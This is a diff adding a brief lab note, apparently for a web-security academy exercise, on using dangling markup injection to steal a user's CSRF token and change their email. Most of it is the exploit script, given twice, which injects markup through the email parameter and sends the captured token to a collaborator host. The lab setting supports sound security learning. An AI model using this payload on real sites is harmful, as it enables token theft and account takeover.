@@ -1,0 +1,21 @@
+this lab I will need to use dangling markup languahe to steal a users CSRF token in order to change theor email address
+
+as the email changing POST request requires a valid CSRF token from the user
+
+<script>
+if(window.name) {
+		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+		} else {
+     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+
+
+<script>
+if(window.name) {
+		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+		} else {
+     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target=';
+}
+</script>
+
